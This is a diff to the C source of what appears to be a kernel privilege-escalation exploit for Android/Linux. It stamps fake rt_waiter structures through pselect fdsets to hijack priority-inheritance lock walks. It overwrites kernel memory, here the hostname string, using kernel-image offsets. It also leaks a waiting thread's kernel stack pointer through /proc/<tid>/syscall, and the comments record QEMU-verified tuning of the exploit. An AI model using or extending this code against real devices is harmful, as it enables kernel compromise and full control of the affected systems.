@@ -488,7 +488,11 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
             tree_r = 0;
             tree_l = tgt;
           } else if (ph == 6) {
-            tree_pc = 0x00000044574E5057ULL; /* "PWNED\0" */
+            /* F27-safe shape: pc=tail+0x40 (parent stays in scratch —
+             * change_child writes tail+0x10, mapped), l=hostname → the
+             * erase stores tail+0x40's bytes into nodename. Box lives,
+             * hostname readback shows the landing. */
+            tree_pc = tail + 0x40;
             tree_r = 0;
             tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x027CBDF1ULL);
           } else {
@@ -504,6 +508,15 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
           stack_prio = (ph == 5) ? 139 : 3;
           stack_deadline = 0;
           stack_lock = tail + 0x400 + (uint64_t)(ph - 1) * 0x20;
+          if (env_flag("MODE4_QEMU_TRAP", 0)) {
+            /* lock = RO text: a trylock fault at the text address PROVES
+             * the walk reads our word9 (stamp -> waiter->lock). */
+            stack_lock = (uint64_t)text_addr(
+                KIMAGE_TEXT_BASE +
+                (active_offsets ? active_offsets->off_ashmem_ioctl : 0));
+            pr_info("QEMU_TRAP lock=%016llx\n",
+                    (unsigned long long)stack_lock);
+          }
           pr_info("stack mode4 SC_UMASK ph=%d tgt=%016llx val=%016llx\n",
                   ph, (unsigned long long)tree_l,
                   (unsigned long long)tree_pc);
@@ -1920,6 +1933,20 @@ void selfstamp_route(void) {
     atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
     atomic_store(&punch_consume_go, ph);
     durable_proof_log("ss_phase_armed");
+    if (env_flag("QEMU_INIT", 0)) {
+      /* /proc/<tid>/syscall exposes the waiter's kernel SP while blocked
+       * in select — lets userspace compute the fdset-vs-rt_waiter delta. */
+      char pp[96], sb[256] = {0};
+      snprintf(pp, sizeof(pp), "/proc/self/task/%d/syscall",
+               (int)atomic_load(&waiter_tid));
+      read_first_line(pp, sb, sizeof(sb));
+      pr_info("QEMU_WAITER_SYSCALL=[%.200s]\n", sb);
+      snprintf(pp, sizeof(pp), "/proc/self/task/%d/stat",
+               (int)atomic_load(&waiter_tid));
+      read_first_line(pp, sb, sizeof(sb));
+      pr_info("QEMU_WAITER_STAT_TAIL=[%.120s]\n",
+              sb + (strlen(sb) > 120 ? strlen(sb) - 120 : 0));
+    }
     if (ph == 1 && !env_flag("SELFSTAMP_NOUNLOCK", 0)) {
       /* MID-STAMP unlock (Quest3 Step-3 repositioned): the first select
        * below places the stamp, THEN we release f_pi_chain — the
@@ -1951,15 +1978,30 @@ void selfstamp_route(void) {
         break;
     }
     /*
-     * FINAL STAMP = ONE LONG BLOCKING select (F27's winning shape): the
-     * waiter blocks on the never-ready timerfd for seconds — the fdset
-     * stamp is perfectly STABLE while the consumer's walk (and any
-     * kernel-side PI walk) reads it. No tearing, no pre-window: the
-     * spin above already covered the dangling-live-unstamped gap.
+     * QEMU-verified: a LONG BLOCKING select lets kernel IRQ entries
+     * (which nest on the task stack) clobber the stamp region — the
+     * consumer then reads FPSIMD junk at waiter->lock and panics.
+     * Instead SPIN-STAMP through the punch: each select(tv=0) re-copies
+     * the fdsets; the walk reads a stamp refreshed thousands of times
+     * per second (tear window = the ~us copy, far safer than 100 Hz
+     * IRQ clobber of a frozen stamp).
      */
     {
-      struct timeval tvb = {.tv_sec = 1, .tv_usec = 0};
-      select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &tvb);
+      struct timespec tq0;
+      clock_gettime(CLOCK_MONOTONIC, &tq0);
+      for (;;) {
+        select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &tv0);
+        if (atomic_load(&consumer_calls) >= 1)
+          break;
+        sched_yield(); /* keep kthreads/other threads scheduled under
+                          QEMU TCG (spin otherwise starves the vCPU) */
+        struct timespec tqn;
+        clock_gettime(CLOCK_MONOTONIC, &tqn);
+        long el = (tqn.tv_sec - tq0.tv_sec) * 1000000L +
+                  (tqn.tv_nsec - tq0.tv_nsec) / 1000;
+        if (el >= 300000)
+          break;
+      }
     }
     /*
      * Dying-box harvester: the moment the walk starts, dump every
